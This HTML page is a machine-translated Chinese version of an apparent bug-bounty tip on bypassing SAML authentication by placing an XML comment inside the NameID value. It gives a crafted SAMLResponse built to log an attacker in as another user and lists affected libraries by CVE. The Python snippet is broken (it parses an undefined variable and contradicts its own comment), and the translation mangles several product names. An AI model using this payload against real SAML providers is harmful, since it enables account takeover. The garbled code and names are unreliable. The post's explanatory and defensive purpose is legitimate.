<html>
<head>
<title>Bounty Tip: How to bypass authorization in SAML !</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">赏金提示:如何在SAML中绕过授权！</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/bounty-tip-how-to-bypass-authorization-in-saml-f7577a6541c4?source=collection_archive---------1-----------------------#2020-04-03">https://infosecwriteups.com/bounty-tip-how-to-bypass-authorization-in-saml-f7577a6541c4?source=collection_archive---------1-----------------------#2020-04-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="393e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">安全声明标记语言(SAML)是一种基于XML的开放标准，用于在流程各方之间交换身份验证和授权数据。漏洞受各种SSO提供者和多个使用SAML SSO(单点登录)的库的决策的影响。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/20fc3ba1a7290a411c44ecce8fbbc596.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GXhWoKC3_LwVMGPB_6gATw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">(安全断言标记语言)SAML</figcaption></figure><blockquote class="lb lc ld"><p id="5c46" class="jn jo le jp b jq jr js jt ju jv jw jx lf jz ka kb lg kd ke kf lh kh ki kj kk ij bi translated">使用SAML协议，用户只需一个用户名和密码就可以访问许多云应用程序。单点登录(SSO)是一种常见的技术，它允许您通过“第三方”作为第三方web应用程序登录到web应用程序。在这个实现中，存在一个错误，它允许攻击者在用户名字段中放置注释，唯一的条件是存在一个有效的用户名。</p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi li"><img src="../Images/8b43fce117f211bc964c96d74a2e14d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/1*Yj6G7IQVckTvNLmLVFgVlg.gif"/></div></figure><p id="ad08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">问题在于XML标记中的注释处理方法。当您在用户名字段中放置注释代码时，会出现换行符。在处理用户名时，预处理器“切断”注释字段后的值，并且在检查时不考虑该值:</p><pre class="km kn ko kp gt lj lk ll lm aw ln bi"><span id="d421" class="lo lp iq lk b gy lq lr l ls lt">import xml.etree.ElementTree as et<br/>doc = "&lt;NameID&gt;test&lt;!-- comment --&gt;user&lt;/NameID&gt;"<br/>data = et.fromstring(payload)<br/>return data.text # returns 'testuser'</span></pre><ul class=""><li id="509f" class="lu lv iq jp b jq jr ju jv jy lw kc lx kg ly kk lz ma mb mc bi translated">预期值是“testuser”，但在“break”之后，将只返回“test”的值。</li><li id="3d8f" class="lu lv iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">例如，在SP处理过程中，拥有user@user.com.evil.com账户<strong class="jp ir">权限的用户可以更改SAML，将NameID替换为user@user.com</strong>的<strong class="jp ir">账户:</strong></li></ul><pre class="km kn ko kp gt lj lk ll lm aw ln bi"><span id="315c" class="lo lp iq lk b gy lq lr l ls lt">&lt;SAMLResponse&gt;<br/>    &lt;Issuer&gt;https://idp.com/&lt;/Issuer&gt;<br/>    &lt;Assertion ID="_id1234"&gt;<br/>        &lt;Subject&gt;<br/>            &lt;NameID&gt;user@user.com&lt;!----&gt;.evil.com&lt;/NameID&gt;<br/>        &lt;/Subject&gt;<br/>    &lt;/Assertion&gt;<br/>    &lt;Signature&gt;<br/>        &lt;SignedInfo&gt;<br/>            &lt;CanonicalizationMethod Algorithm="xml-c14n11"/&gt;<br/>            &lt;Reference URI="#_id1234"/&gt;<br/>        &lt;/SignedInfo&gt;<br/>        &lt;SignatureValue&gt;<br/>            some base64 data that represents the signature of the assertion<br/>        &lt;/SignatureValue&gt;<br/>    &lt;/Signature&gt;<br/>&lt;/SAMLResponse&gt;</span></pre><p id="065c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">以下解决方案易受此攻击:</strong></p><ul class=""><li id="b814" class="lu lv iq jp b jq jr ju jv jy lw kc lx kg ly kk lz ma mb mc bi translated">OneLogin-python-SAML-CVE-2017–11427</li><li id="842f" class="lu lv iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">OneLogin-ruby-SAML-CVE-2017–11428</li><li id="ffc9" class="lu lv iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">聪明-Sam L2-js-CVE-2017–11429</li><li id="f3ad" class="lu lv iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">omni auth-SAML-CVE-2017–11430</li><li id="1dae" class="lu lv iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">CVE希博勒斯-2018–0489</li><li id="ada4" class="lu lv iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">双网络网关-CVE-2018–7340</li></ul><p id="9ef8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">值得注意的是，该攻击对受双因素认证保护的账户不起作用(根据谷歌的统计，这包括在约10%的用户中)。</p><p id="5f1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="le">要防止此类攻击，需要更新使用的库，禁用重要网络中用户账号的公开注册，或者放弃不跳过评论的规范化算法。</em></p><p id="9798" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">#快乐狩猎#错误提示</p></div></div>    
</body>
</html>